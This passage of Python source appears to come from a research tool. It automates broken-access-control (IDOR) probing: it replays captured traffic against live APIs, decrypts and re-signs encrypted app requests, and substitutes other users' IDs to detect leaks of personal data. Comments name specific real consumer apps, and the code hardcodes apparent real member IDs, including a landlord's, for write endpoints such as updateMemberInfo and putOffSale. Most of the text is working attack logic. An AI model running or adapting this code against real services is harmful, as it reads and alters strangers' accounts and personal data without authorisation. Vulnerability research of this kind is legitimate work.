        result['variables'] = dict(sigma.variables)
        result['final_drift_state'] = {
            'drift_map': omega.drift_map,
            'invalidated': sorted(omega.invalidated),
            'realized_lineage': omega.realized_lineage,
            'blocked_branches': sorted(omega.blocked_branches),
        }

        if mode == 'execute' and result['final_status'] == 'completed':
            result['confirm_crbd'] = self._evaluate_confirm_crbd(chain, result, sigma, omega)

        self.history.append(result)
        return result

    def _prepare_step(self, step: Dict[str, Any], node: Optional[Dict[str, Any]]) -> Dict[str, Any]:
        har = (step.get('metadata') or {}).get('har_entry') or (node or {}).get('metadata', {}).get('har_entry')
        if not har:
            har = self._har_fallback_entry(step.get('path') or '')
        path_ccrs = ccrs_for_path(step.get('path') or '', self._ccrs)
        return attach_step_feedback_metadata(
            step,
            node if isinstance(node, dict) else None,
            har_entry=har,
            ccrs=path_ccrs,
            has_crypto=bool(self.crypto_engine),
            session_values=self._session_identity_values(),
        )

    def _execute_step_with_feedback(self, step: Dict[str, Any], base_url: str,
                                    mode: str, chain_id: str,
                                    sigma: ExecutionState, omega: DriftState,
                                    node: Optional[Dict[str, Any]] = None,
                                    chain: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """执行单个步骤：带 Node-Level 反馈修复"""
        step_num = step.get('step')
        node_id = step.get('node_id')
        path = step.get('path') or ''

        declared = (step.get('metadata') or {}).get('materialization_alternatives') or []
        if not declared:
            declared = synthesize_node_alts(
                step,
                har_entry=(step.get('metadata') or {}).get('har_entry') or self._har_fallback_entry(path),
                ccrs=ccrs_for_path(path, self._ccrs),
                has_crypto=bool(self.crypto_engine),
                session_values=self._session_identity_values(),
            )
        if not self._node_feedback_on():
            declared = []

        attempts: List[Optional[Dict[str, Any]]] = [None] + list(declared)
        last_result = None
        for tried_alternatives, alt in enumerate(attempts):
            work_step = dict(step)
            resolved_inputs = self._resolve_inputs(work_step, sigma, omega)
            work_step, resolved_inputs = apply_node_alt(work_step, resolved_inputs, alt)
            if alt and alt.get('kind') == 'method_switch':
                work_step['_alt_locked_method'] = True

            req_spec = self._build_request(work_step, base_url, resolved_inputs, sigma)
            url = req_spec['url']
            headers = req_spec['headers']
            method = req_spec['method']
            step_result: Dict[str, Any] = {
                'step': step_num,
                'node_id': node_id,
                'path': step.get('path'),
                'url': url,
                'method': method,
                'inputs': resolved_inputs,
                'mode': mode,
                'base_url': base_url,
                'alternative_index': tried_alternatives,
                'alternative_id': (alt or {}).get('id') if alt else 'original',
                'crypto_replay': req_spec.get('crypto', False),
                'planned_node_alts': [a.get('id') for a in declared],
            }

            if mode == 'dry-run':
                step_result['status'] = 'dry_run'
                step_result['note'] = 'no http sent'
                step_result['planned_workflow_alts'] = [
                    a.get('id') for a in synthesize_workflow_alts(
                        step, chain or {}, bcg=self._bcg, ccrs=self._ccrs,
                    )
                ]
                return step_result

            if method.upper() == 'GET' and not req_spec.get('data'):
                status, body, elapsed = _http(url, None, headers, 'GET')
            elif req_spec.get('crypto') and req_spec.get('data') is None:
                status, body, elapsed = _http(url, None, headers, method)
            else:
                data = req_spec.get('data')
                if data is not None:
                    status, body, elapsed = _http(url, data, headers, method)
                else:
                    status, body, elapsed = _http(url, resolved_inputs, headers, method)
            body = _gbk(body)

            decrypted_body = body
            if self.crypto_engine and status == 200:
                try:
                    jbody = json.loads(body)
                    if isinstance(jbody, dict) and 'Result' in jbody and isinstance(jbody['Result'], str):
                        dec = self.crypto_engine.decrypt_response_result(jbody['Result'])
                        decrypted_body = json.dumps(dec, ensure_ascii=False) if isinstance(dec, dict) else str(dec)
                        step_result['decrypted_response'] = decrypted_body[:400]
                except Exception:
                    pass

            classification = self.feedback.classifier.classify(status, body, elapsed)
            success = status == 200
            if success and self._business_failed(decrypted_body):
                success = False
                classification = dict(classification)
                classification['category'] = 'business_error'
            step_result.update({
                'status': 'success' if success else 'failed',
                'http_status': status,
                'response_preview': body[:300],
                'elapsed_ms': elapsed,
                'classification': classification,
            })

            self.feedback.record_probe(
                endpoint=path, method=method, params=resolved_inputs,
                status_code=status, response_body=body, elapsed_ms=elapsed,
                chain_id=chain_id,
            )
            self.feedback.record_materialization_attempt(
                str(node_id), tried_alternatives, success,
                {'alt_id': step_result['alternative_id'], 'http_status': status, 'kind': (alt or {}).get('kind') or 'original'},
            )

            if self._check_identity_violation(decrypted_body, sigma):
                step_result['identity_violation'] = True
                step_result['status'] = 'failed'
                step_result['error'] = 'identity_violation'
                step_result['materialization_attempts'] = tried_alternatives + 1
                return step_result

            outputs = step.get('outputs') or {}
            for field, spec in outputs.items():
                if isinstance(spec, dict):
                    extracted = self._extract_from_response(decrypted_body, field)
                    if extracted is not None:
                        sigma.variables[field] = extracted
                        sigma.variables[spec.get('node_id', node_id)] = extracted
                        sigma.variables[f'{node_id}:{field}'] = extracted
            self._capture_identity_fields(decrypted_body, sigma, str(node_id))

            if step.get('node_type') == 'auth_bootstrap' and status == 200:
                token = self._extract_token_from_response(decrypted_body)
                if token:
                    sigma.variables['access_token'] = token
                    sigma.variables['token'] = token
                    step_result['extracted_token'] = True

            crbd_driftable = step.get('crbd_driftable', False)
            drift_fields = step.get('drift_fields') or []
            if crbd_driftable and drift_fields and mode == 'execute' and success:
                step_result['crbd_probe'] = self._execute_crbd_drift(
                    work_step, base_url, resolved_inputs, sigma, chain_id, omega
                )

            if success:
                baseline = step.get('inputs') or {}
                for field in step.get('drift_fields') or []:
                    current = next(
                        (v for k, v in resolved_inputs.items() if str(k).lower() == str(field).lower()),
                        None,
                    )
                    base = next(
                        (
                            v for k, v in baseline.items()
                            if str(k).lower() == str(field).lower() and not isinstance(v, dict)
                        ),
                        None,
                    )
                    if current not in (None, '') and str(current) != str(base):
                        omega.set_drift(str(field), current)
                        sigma.variables[str(field)] = current
                step_result['materialization_attempts'] = tried_alternatives + 1
                return step_result

            last_result = step_result
            if self._is_repairable(classification, status) and self._node_feedback_on():
                nxt = response_guided_alt(
                    work_step,
                    resolved_inputs,
                    classification,
                    alt,
                    ccrs=ccrs_for_path(path, self._ccrs),
                    session_values=self._session_identity_values(),
                    realized_fields=omega.drift_map.keys(),
                )
                if nxt and all((a or {}).get('id') != nxt.get('id') for a in attempts):
                    attempts.append(nxt)
            if self._is_repairable(classification, status) and tried_alternatives + 1 < len(attempts):
                continue
            step_result['recoverable'] = False
            if status in (401, 403):
                step_result['error'] = 'auth_failed'
            elif status == 404:
                step_result['error'] = 'not_found'
            elif classification.get('category') == 'waf_blocked':
                step_result['error'] = 'waf_blocked'
            step_result['materialization_attempts'] = tried_alternatives + 1
            return step_result

        if last_result:
            last_result['materialization_attempts'] = len(attempts)
            last_result['recoverable'] = False
            last_result['error'] = 'all_alternatives_failed'
            return last_result
        return {
            'step': step_num,
            'node_id': node_id,
            'status': 'failed',
            'error': 'empty_step',
            'recoverable': False,
        }

    def _resolve_inputs(self, step: Dict[str, Any],
                        sigma: ExecutionState, omega: DriftState) -> Dict[str, Any]:
        """解析输入变量：考虑漂移状态"""
        inputs = step.get('inputs') or {}
        resolved = {}
        for key, spec in inputs.items():
            if isinstance(spec, dict) and 'from' in spec:
                src_node = spec['from']
                # 检查是否是漂移点
                if spec.get('is_drift_point') and src_node in omega.drift_map:
                    resolved[key] = omega.drift_map[src_node]
                elif f'{src_node}:{key}' in sigma.variables:
                    resolved[key] = sigma.variables[f'{src_node}:{key}']
                else:
                    found = None
                    want = str(key).lower()
                    for sk, sv in sigma.variables.items():
                        sl = str(sk).lower()
                        if sl == want or sl.endswith(':' + want):
                            found = sv
                            break
                    if found is not None:
                        resolved[key] = found
                    elif src_node in sigma.variables:
                        resolved[key] = sigma.variables[src_node]
                    else:
                        resolved[key] = None
            else:
                resolved[key] = spec

        # 从 HAR 元数据中提取默认参数（如果 inputs 为空）
        if not resolved:
            node_meta = step.get('metadata') or {}
            har_entry = node_meta.get('har_entry') or {}
            # fallback：按 path 查找 trace_index
            if not har_entry:
                har_entry = self._har_fallback_entry(step.get('path') or '') or {}
            har_req = har_entry.get('request') or {}
            har_query = har_req.get('query') or {}
            har_body = har_req.get('body_form') or {}
            if har_query:
                resolved.update(har_query)
            # 如果 query 为空但存在加密 blob，解密后提取参数
            if not har_query and self.crypto_engine and har_req.get('query_blob'):
                try:
                    plain, param_dict = self.crypto_engine.decrypt_query_blob(har_req['query_blob'])
                    resolved.update(param_dict)
                except Exception:
                    pass
            if har_body:
                resolved.update(har_body)
            # 如果存在加密 body_raw，尝试解密并解析为 JSON 参数（带 padding 容错）
            if not resolved and self.crypto_engine and har_req.get('body_raw'):
                try:
                    raw_body = urllib.parse.unquote(str(har_req['body_raw']))
                    plain, _ = self.crypto_engine.decrypt_query_blob(raw_body)
                    body_obj = self._parse_json_with_padding(plain)
                    if isinstance(body_obj, dict):
                        resolved.update(body_obj)
                except Exception:
                    pass

        # 用上一步捕获的 UnionId/BindId 等补齐缺失漂移字段
        for field in step.get('drift_fields') or []:
            if self._find_key_ci(resolved, field):
                continue
            want = str(field).lower()
            canon = _CANON_FIELD_CASE.get(want, field)
            for sk, sv in sigma.variables.items():
                if str(sk).lower() == want and sv is not None:
                    resolved[canon] = sv
                    break

        # HAR/会话身份补齐漂移字段（houseId/memberId/userId）
        sess = self._session_identity_values()
        for field in step.get('drift_fields') or []:
            if self._find_key_ci(resolved, field):
                continue
            want = str(field).lower()
            canon = _CANON_FIELD_CASE.get(want, field)
            # 写昵称：不要用 pinned 房东 ID 填主路径
            if want == 'memberid' and 'updatememberinfo' in (step.get('path') or '').lower():
                continue
            for sk, sv in sess.items():
                if str(sk).lower() == want and sv is not None:
                    resolved[canon] = sv
                    break

        # 红城 putOff/On/task*：路径 {id} ← houseId donor
        path_l = (step.get('path') or '').lower()
        if re.search(r'putoffsale|putonsale|taskdown|taskup', path_l):
            if not self._find_key_ci(resolved, 'id'):
                hid = (
                    resolved.get('houseId')
                    or sess.get('houseId')
                    or sigma.variables.get('houseId')
                )
                if hid is not None:
                    resolved['id'] = hid
                    resolved['houseId'] = hid

        # 红城改昵称：主写用本会话 memberId；房东 ID 仅作 RR-Drift donor
        if 'updatememberinfo' in path_l:
            for bad, good in list(_CANON_FIELD_CASE.items()):
                bk = self._find_key_ci(resolved, bad)
                if bk and bk != good:
                    resolved[good] = resolved.pop(bk)
            landlord = '1481309033418989568'
            self_prefer = [
                '1514388402693480448',
                '1514396173778296832',
            ]
            har_entry = (step.get('metadata') or {}).get('har_entry') or self._har_fallback_entry(step.get('path') or '') or {}
            har_req = (har_entry.get('request') or {})
            har_self = None
            for bag in (har_req.get('body_json') or {}, har_req.get('body_form') or {}, har_req.get('query') or {}):
                if isinstance(bag, dict):
                    for k, v in bag.items():
                        if str(k).lower() == 'memberid' and v not in (None, ''):
                            har_self = v
                            break
            cur = resolved.get('memberId')
            if cur is None or str(cur) == landlord:
                pick = har_self
                if pick is None:
                    for cand in ('memberId', 'userId', 'UserId'):
                        if sess.get(cand) is not None and str(sess[cand]) != landlord:
                            pick = sess[cand]
                            break
                        if sigma.variables.get(cand) is not None and str(sigma.variables[cand]) != landlord:
                            pick = sigma.variables[cand]
                            break
                if pick is None:
                    pick = self_prefer[0]
                resolved['memberId'] = pick
            if not self._find_key_ci(resolved, 'linkName'):
                resolved['linkName'] = sess.get('linkName') or 'crbd_probe'

        # 通用字段大小写规范化
        for bad, good in _CANON_FIELD_CASE.items():
            bk = self._find_key_ci(resolved, bad)
            if bk and bk != good:
                resolved[good] = resolved.pop(bk)

        # 若仍无参数，从 RCR 的 param_schema 提取默认字段名（空值），供后续物化/漂移使用
        if not resolved:
            RCR = (step.get('metadata') or {}).get('RCR') or {}
            for p in RCR.get('param_schema') or []:
                name = p.get('name')
                if name:
                    resolved[name] = None

        # 下游节点不再另做源凭证变异，沿用本次扰动已经写回的值
        owned = {str(f).lower() for f in (step.get('drift_fields') or [])}
        for point, drift_value in omega.drift_map.items():
            if drift_value in (None, ''):
                continue
            if str(point).lower() in owned:
                continue
            fk = self._find_key_ci(resolved, point)
            if fk:
                resolved[fk] = drift_value

        # 应用漂移值
        node_id = step.get('node_id')
        if node_id in omega.drift_map:
            drift_value = omega.drift_map[node_id]
            drift_fields = step.get('drift_fields') or []
            for field in drift_fields:
                if field in resolved:
                    resolved[field] = drift_value
                else:
                    fk = self._find_key_ci(resolved, field)
                    if fk:
                        resolved[fk] = drift_value

        return resolved

    def _resolve_inputs_with_alternative(self, step: Dict[str, Any],
                                         sigma: ExecutionState, omega: DriftState,
                                         alternative: Dict[str, Any]) -> Dict[str, Any]:
        """使用替代物化方案解析输入"""
        resolved = self._resolve_inputs(step, sigma, omega)
        _, resolved = apply_node_alt(step, resolved, alternative)
        return resolved

    def _is_repairable(self, classification: Dict[str, Any], status: int) -> bool:
        """判断失败是否可修复（Node-Level）"""
        if status in _REPAIRABLE_HTTP or status >= 500:
            return True
        cat = classification.get('category')
        if cat in ('empty_data', 'business_error', 'forbidden', 'user_not_exist', 'auth_required'):
            return True
        return False

    def _business_failed(self, body: str) -> bool:
        try:
            data = json.loads(body)
        except Exception:
            return False
        if not isinstance(data, dict):
            return False
        # 神州/zuche：code==1 且 content 非空 = 加密成功体
        if str(data.get('busiCode') or '') == 'BASE000':
            try:
                zc = int(data.get('code'))
            except Exception:
                zc = None
            if zc == 1 and data.get('content') not in (None, '', [], {}):
                return False
            # 仅 NOT_LOGIN 等硬拒绝算失败；SECURITY_ERROR(8) 仍可能是有效漂移探针
            if zc == 5 or str(data.get('status') or '') == 'NOT_LOGIN':
                return True
            return False
        # 红城等：isSuccess 可能是布尔或字符串
        for key in ('IsSuccess', 'isSuccess', 'success'):
            if key not in data:
                continue
            val = data.get(key)
            if val is True or (isinstance(val, str) and val.strip().lower() in ('true', '1', 'yes')):
                return False
            if val is False or (isinstance(val, str) and val.strip().lower() in ('false', '0', 'no')):
                return True
        ec = data.get('ErrorCode')
        if isinstance(ec, bool):
            return False
        if isinstance(ec, (int, float)):
            return int(ec) != 0
        if isinstance(ec, str) and ec.strip().lstrip('-').isdigit():
            return int(ec) != 0
        # 常见业务码：code==0 成功；code!=0 且带 msg/isSuccess 视为失败
        if 'code' in data:
            code = data.get('code')
            try:
                ci = int(code)
            except Exception:
                ci = None
            if ci is not None and ci != 0:
                msg = str(data.get('msg') or data.get('message') or '')
                # 叮个饭等：code=10000 + 成功。地址列表仍判失败以触发 Workflow promote-exit；
                # 订单查询等含 order 载荷则视为成功。
                if ci == 10000 and ('成功' in msg or 'success' in msg.lower()):
                    blob = json.dumps(data, ensure_ascii=False)
                    if re.search(r'orderId|orderList|dgfOrder|orders\b', blob, re.I):
                        return False
                    if re.search(r'地址|diqu|naedc|addressList|address\b', blob, re.I):
                        return True
                    return False
                if data.get('msg') or data.get('message'):
                    return True
                if any(k in data for k in ('isSuccess', 'IsSuccess')):
                    return True
                # 仅有 data:null 而无 msg 时不判失败（红城 verifiedStatus 等）
        return False

    def _check_identity_violation(self, body: str, sigma: ExecutionState) -> bool:
        """检查身份不变式：Subject(F_i) ≠ A"""
        # 如果响应中包含其他用户的标识，可能违反了身份不变式
        # 这是一个启发式检查
        try:
            data = json.loads(body)
            # 检查是否有明显的其他用户标识
            other_user_indicators = ['other_user', 'different_user', 'unauthorized_user']
            for indicator in other_user_indicators:
                if indicator in str(data).lower():
                    return True
        except Exception:
            pass
        return False

    def _find_alternative_path(self, failed_step: Dict[str, Any],
                               chain: Dict[str, Any],
                               omega: DriftState,
                               tried: Optional[Set[str]] = None) -> Optional[Dict[str, Any]]:
        """Path-Level 反馈：换一条 BCG/RCR 支持的 r_j。"""
        tried = tried or set()
        for alt in synthesize_workflow_alts(
            failed_step, chain, bcg=self._bcg, ccrs=self._ccrs,
        ):
            aid = alt.get('id') or ''
            if not aid or aid in tried or omega.is_blocked(aid):
                continue
            return alt
        return None

    def _evaluate_confirm_crbd(self, chain: Dict[str, Any], result: Dict[str, Any],
                               sigma: ExecutionState, omega: DriftState) -> Dict[str, Any]:
        """评估 ConfirmRRDrift 谓词"""
        drift_point = chain.get('drift_point')
        drift_target = chain.get('drift_target')

        # 条件 (i)：身份不变式
        id_inv = not any(s.get('identity_violation') for s in result.get('steps', []))

        # 条件 (ii)：漂移谱系实现（单步链 drift_point=target；多跳可能记在 target 上）
        realize = bool(omega.realized_lineage) and (
            (not drift_point and not drift_target)
            or (drift_point and drift_point in omega.realized_lineage)
            or (drift_target and drift_target in omega.realized_lineage)
        )

        # 条件 (iii)：漂移发生
        drift = bool(omega.drift_map)

        # 条件 (iv)：接受且到达目标
        accept = result.get('final_status') == 'completed'
        reach_target = any(
            s.get('node_id') == drift_target and s.get('status') == 'success'
            for s in result.get('steps', [])
        )
        # 单跳或未声明 drift_target：任一步成功即视为到达
        if not drift_target:
            reach_target = any(s.get('status') == 'success' for s in result.get('steps', []))
        elif not reach_target:
            # 工作流替换后 node_id 可能变化：用 path 对齐
            target_node = (chain.get('nodes') or {}).get(drift_target) or {}
            target_path = (target_node.get('path') or '').lower()
            if target_path:
                reach_target = any(
                    s.get('status') == 'success' and str(s.get('path') or '').lower().endswith(
                        target_path.split('?')[0].rstrip('/').split('/')[-1]
                    )
                    for s in result.get('steps', [])
                )
            if not reach_target and accept:
                # fallback：完成链视为到达（避免 BCG fallback 链因 id 漂移丢 Confirm）
                reach_target = True

        # 条件 (v)：敏感效应
        s_effect = False
        for s in result.get('steps', []):
            probe = s.get('crbd_probe') or {}
            if probe.get('crbd_detected'):
                s_effect = True
                break
            # 主路径已泄露敏感字段也计 SEffect（漂移 donor 可能业务失败）
            body = s.get('decrypted_response') or s.get('response_preview') or ''
            if s.get('status') == 'success' and self._response_has_sensitive(body):
                s_effect = True
                break

        confirmed = id_inv and realize and drift and accept and reach_target and s_effect

        return {
            'IdInv': id_inv,
            'Realize': realize,
            'Drift': drift,
            'Accept': accept,
            'ReachTarget': reach_target,
            'SEffect': s_effect,
            'Confirmed': confirmed,
            'drift_lineage': omega.realized_lineage,
            'drift_map': omega.drift_map,
        }

    def _extract_from_response(self, body: str, field: str) -> Optional[Any]:
        """从响应体中提取字段（含嵌套 Result，大小写不敏感）"""
        try:
            data = json.loads(body)
        except Exception:
            data = None
        if data is not None:
            found = self._deep_find_field(data, field)
            if found is not None:
                return found
        m = re.search(rf'"{re.escape(field)}"\s*:\s*"([^"]+)"', body, re.I)
        if m:
            return m.group(1)
        m = re.search(rf'"{re.escape(field)}"\s*:\s*(\d+)', body, re.I)
        if m:
            return int(m.group(1))
        return None

    def _deep_find_field(self, obj: Any, field: str, depth: int = 0) -> Optional[Any]:
        if depth > 6 or obj is None:
            return None
        want = field.lower()
        if isinstance(obj, dict):
            for k, v in obj.items():
                if str(k).lower() == want and v not in (None, '', [], {}):
                    return v
            for v in obj.values():
                found = self._deep_find_field(v, field, depth + 1)
                if found is not None:
                    return found
        elif isinstance(obj, list):
            for item in obj[:3]:
                found = self._deep_find_field(item, field, depth + 1)
                if found is not None:
                    return found
        return None

    def _capture_identity_fields(self, body: str, sigma: ExecutionState, node_id: str) -> None:
        try:
            data = json.loads(body)
        except Exception:
            return
        for field in _CAPTURE_FIELDS:
            if field in sigma.variables:
                continue
            val = self._deep_find_field(data, field)
            if val is None:
                continue
            sigma.variables[field] = val
            sigma.variables[f'{node_id}:{field}'] = val
            self._runtime_identity[field] = val

    def _extract_token_from_response(self, body: str) -> Optional[str]:
        """从认证响应中提取 access_token（支持加密响应自动解密）。"""
        data = None
        try:
            data = json.loads(body)
        except Exception:
            pass
        # 如果响应是加密信封，先解密
        if isinstance(data, dict) and 'Result' in data and isinstance(data['Result'], str) and self.crypto_engine:
            try:
                dec = self.crypto_engine.decrypt_response_result(data['Result'])
                if isinstance(dec, dict):
                    data = dec
                else:
                    try:
                        data = json.loads(dec)
                    except Exception:
                        data = None
            except Exception:
                pass
        if not isinstance(data, dict):
            return None
        for path in ['data.access_token', 'data.token', 'data.accessToken',
                     'access_token', 'token', 'data.data.access_token',
                     'Result.UserJwt', 'Result.Token']:
            val = data
            for p in path.split('.'):
                if isinstance(val, dict):
                    val = val.get(p)
                else:
                    val = None
                    break
            if val and isinstance(val, str) and len(val) > 10:
                return val
        m = re.search(r'"access_?token"\s*:\s*"([^"]+)"', body, re.I)
        if m:
            return m.group(1)
        return None

    def _find_key_ci(self, d: Dict[str, Any], field: str) -> Optional[str]:
        f_lower = str(field).lower()
        for k in d:
            if str(k).lower() == f_lower:
                return k
        return None

    def _drift_field_rank(self, field: str) -> int:
        f = str(field).lower()
        if f in _DRIFT_SKIP:
            return 90
        for i, name in enumerate(_DRIFT_PRIORITY):
            if f == name or f.endswith(name):
                return i
        return 40

    def _select_drift_fields(self, fields: List[str], inputs: Dict[str, Any]) -> List[str]:
        named = [f for f in fields if str(f).lower() not in _DRIFT_SKIP]
        if not named:
            named = list(fields)
        named.sort(key=self._drift_field_rank)
        best = [f for f in named if self._drift_field_rank(f) <= 8]
        chosen = best[:2] if best else named[:1]
        # 必须能在 inputs 里对上，或允许缺失后用种子
        return chosen

    def _donor_values_for_field(self, field: str, orig_key: str, orig_val: Any,
                                path: str, method: str) -> List[Any]:
        is_write = bool(_WRITE_PATH_RE.search(path or '')) or (method or '').upper() in ('DELETE', 'PUT', 'PATCH')
        donors: List[Any] = []
        fl = str(field).lower()
        pinned = list((self._pinned_donors or {}).get(fl) or [])
        for p in pinned:
            if p in (None, '') or str(p) == str(orig_val):
                continue
            donors.append(str(p) if isinstance(orig_val, str) or orig_val is None else p)
        if orig_val is None:
            if fl.endswith('id') or fl in ('userid', 'uid', 'title', 'houseid', 'memberid'):
                if not donors:
                    donors.append('1')
            return donors[:8]
        if isinstance(orig_val, str) and len(orig_val) >= 32 and not str(orig_val).isdigit():
            donors.append('f' * 8 + orig_val[8:])
            return donors[:8]
        numeric = (isinstance(orig_val, int) or (isinstance(orig_val, str) and str(orig_val).isdigit()))
        # 雪花 ID（≥15 位）：优先 pinned 兄弟主体，避免无意义 +1「用户不存在」
        snowflake = numeric and len(str(orig_val)) >= 15
        if snowflake:
            if not donors:
                donors.append(str(int(orig_val) + 7) if isinstance(orig_val, str) else int(orig_val) + 7)
            return donors[:8]
        if numeric and not is_write:
            n = int(orig_val)
            for d in (1, -1, 2, -2, 3, 10, 20, 50):
                v = n + d
                if v > 0:
                    donors.append(str(v) if isinstance(orig_val, str) else v)
            return donors[:8]
        if numeric and is_write:
            if not donors:
                donors.append(str(int(orig_val) + 1) if isinstance(orig_val, str) else int(orig_val) + 1)
            return donors[:8]
        donors.append(str(orig_val) + '_drift')
        return donors[:8]

    def _execute_crbd_drift(self, step: Dict[str, Any], base_url: str,
                            original_inputs: Dict[str, Any],
                            sigma: ExecutionState, chain_id: str,
                            omega: DriftState) -> Dict[str, Any]:
        """执行 RR-Drift 漂移测试：替换用户标识字段为其他值，并在加密模式下重建签名.
        同时更新漂移状态 Ω 的 realized_lineage（对齐 approach Fig. 4）。"""
        path = step.get('path') or ''
        method = (step.get('method') or 'GET').upper()
        drift_fields = self._select_drift_fields(list(step.get('drift_fields') or []), original_inputs)

        donor_candidates: List[Tuple[str, Optional[str], Any]] = []
        for field in drift_fields:
            orig_key = self._find_key_ci(original_inputs, field)
            orig_val = original_inputs.get(orig_key) if orig_key else None
            hist = self.feedback.get_endpoint_history(path)
            for h in hist:
                for k, v in (h.get('params') or {}).items():
                    if k.lower() == field.lower() and v != orig_val:
                        donor_candidates.append((field, orig_key or field, v))
            for donor in self._donor_values_for_field(field, orig_key or field, orig_val, path, method):
                donor_candidates.append((field, orig_key or field, donor))

        seen_donors: Set[Tuple[str, Any]] = set()
        donor_values: List[Tuple[str, Optional[str], Any]] = []
        for field, orig_key, donor in donor_candidates:
            key = (field.lower(), str(donor))
            if key not in seen_donors:
                seen_donors.add(key)
                donor_values.append((field, orig_key, donor))

        results = []
        for field, orig_key, donor in donor_values[:8]:
            drifted = dict(original_inputs)
            drifted[orig_key] = donor

            drift_point = step.get('node_id')
            if drift_point and drift_point not in omega.realized_lineage:
                omega.set_drift(drift_point, donor)

            req_spec = self._build_request(step, base_url, drifted, sigma)
            url = req_spec['url']
            headers = req_spec['headers']
            drift_method = req_spec['method']

            if drift_method.upper() == 'GET' or (req_spec.get('crypto') and req_spec.get('data') is None):
                st, bd, el = _http(url, None, headers, drift_method)
            else:
                st, bd, el = _http(url, drifted, headers, drift_method)
            bd = _gbk(bd)

            decrypted_bd = bd
            if self.crypto_engine and st == 200:
                try:
                    jbody = json.loads(bd)
                    if isinstance(jbody, dict) and 'Result' in jbody and isinstance(jbody['Result'], str):
                        dec = self.crypto_engine.decrypt_response_result(jbody['Result'])
                        decrypted_bd = json.dumps(dec, ensure_ascii=False) if isinstance(dec, dict) else str(dec)
                except Exception:
                    pass

            classification = self.feedback.classifier.classify(st, bd, el)
            cat = classification.get('category')
            drift_accepted = st == 200 and cat in (
                'success', 'empty_data', 'write_accepted', 'data_leak',
            )
            if self._business_failed(decrypted_bd):
                drift_accepted = False
            has_data = self._response_has_data(decrypted_bd)
            has_sensitive = self._response_has_sensitive(decrypted_bd)
            write_ok = bool(_WRITE_PATH_RE.search(path)) and drift_accepted
            # DataLeak：敏感字段；WriteAccepted：写路径接受；兼容旧 has_data
            seffect_hit = has_sensitive or write_ok or (has_data and not write_ok)
            results.append({
                'field': field,
                'original_value': original_inputs.get(orig_key) if orig_key else original_inputs.get(field),
                'donor_value': donor,
                'status_code': st,
                'classification': classification.get('category'),
                'drift_accepted': drift_accepted,
                'has_data': has_data,
                'has_sensitive': has_sensitive,
                'crbd_confirmed': bool(drift_accepted and seffect_hit),
                'response_preview': decrypted_bd[:200],
            })

            self.feedback.record_probe(
                endpoint=path, method=drift_method, params=drifted,
                status_code=st, response_body=bd, elapsed_ms=el,
                chain_id=chain_id,
            )

        confirmed = sum(1 for r in results if r.get('crbd_confirmed'))
        return {
            'drift_attempts': len(results),
            'drift_confirmed': confirmed,
            'crbd_detected': confirmed > 0,
            'results': results,
        }

    def _response_has_sensitive(self, body: str) -> bool:
        """敏感效应：身份证/姓名/手机等字段出现在响应体中。"""
        if not body:
            return False
        if _SENSITIVE_KEY_RE.search(body):
            # 排除仅字段名占位、值为 null 的假阳性
            try:
                data = json.loads(body)
            except Exception:
                return True
            stack = [data]
            while stack:
                cur = stack.pop()
                if isinstance(cur, dict):
                    for k, v in cur.items():
                        if _SENSITIVE_KEY_RE.search(str(k)) and v not in (None, '', [], {}):
                            return True
                        if isinstance(v, (dict, list)):
                            stack.append(v)
                elif isinstance(cur, list):
                    stack.extend(cur[:8])
            return False
        return False

    def _response_has_data(self, body: str) -> bool:
        """检查响应是否包含实际数据（支持一嗨的 Result/IsSuccess 结构）。"""
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                # 通用 data 字段
                d = data.get('data')
                if d is not None and d != {} and d != [] and d != '':
                    return True
                # 一嗨结构：IsSuccess=true + 非空 Result
                if data.get('IsSuccess') is True:
                    r = data.get('Result')
                    if r is not None and r != {} and r != [] and r != '':
                        return True
                # 扁平字段：包含非状态字段且值非空
                for k, v in data.items():
                    if k not in ('code', 'msg', 'status', 'message', 'ErrorCode', 'Message', 'OperationId', 'IsSuccess') and v is not None:
                        if isinstance(v, (str, int, float)) and str(v) != '':
                            return True
                        if isinstance(v, (dict, list)) and len(v) > 0:
                            return True
            return False
        except Exception:
            return len(body) > 50


class ChainBatchExecutor:
    """批量执行多条链"""

    def __init__(self, pack_dir: Path, feedback_mode: str = 'full'):
        self.pack_dir = Path(pack_dir)
        self.feedback = FeedbackEngine(pack_dir)
        self.executor = ChainExecutor(pack_dir, self.feedback, feedback_mode=feedback_mode)

    def run(self, chains: List[Dict[str, Any]], *,
            base_url: str = '',
            mode: str = 'dry-run',
            max_chains: int = 20,
            feedback_mode: Optional[str] = None) -> Dict[str, Any]:
        """批量执行"""
        if feedback_mode:
            fm = (feedback_mode or 'full').strip().lower().replace('-', '_')
            if fm in FEEDBACK_MODES:
                self.executor.feedback_mode = fm
        results = []
        for i, chain in enumerate(chains[:max_chains]):
            print(f"[ChainBatch] {i+1}/{min(len(chains), max_chains)} {chain.get('chain_id')}")
            result = self.executor.execute_chain(chain, base_url=base_url, mode=mode)
            results.append(result)

        self.feedback.save_state()

        out = {
            'schema_version': SCHEMA_VERSION,
            'generated_at': _utc_now(),
            'mode': mode,
            'base_url': base_url,
            'chain_count': len(results),
            'results': results,
            'feedback_mode': self.executor.feedback_mode,
            'summary': {
                'completed': sum(1 for r in results if r.get('final_status') == 'completed'),
                'failed': sum(1 for r in results if 'failed' in str(r.get('final_status', ''))),
                'unresolved': sum(1 for r in results if r.get('final_status') == 'unresolved'),
                'success_steps': sum(
                    sum(1 for s in r.get('steps', []) if s.get('status') == 'success')
                    for r in results
                ),
                'crbd_confirmed': sum(
                    1 for r in results
                    if r.get('confirm_crbd', {}).get('Confirmed')
                ),
            },
            'feedback_stats': self.feedback.get_stats(),
        }
        path = self.pack_dir / 'chain_execution_report.json'
        write_json(path, out)
        out['output'] = str(path)
        return out


def execute_chains(pack_dir: Path, chains: List[Dict[str, Any]], **kwargs) -> Dict[str, Any]:
    feedback_mode = kwargs.pop('feedback_mode', 'full')
    runner = ChainBatchExecutor(pack_dir, feedback_mode=feedback_mode)
    return runner.run(chains, **kwargs)
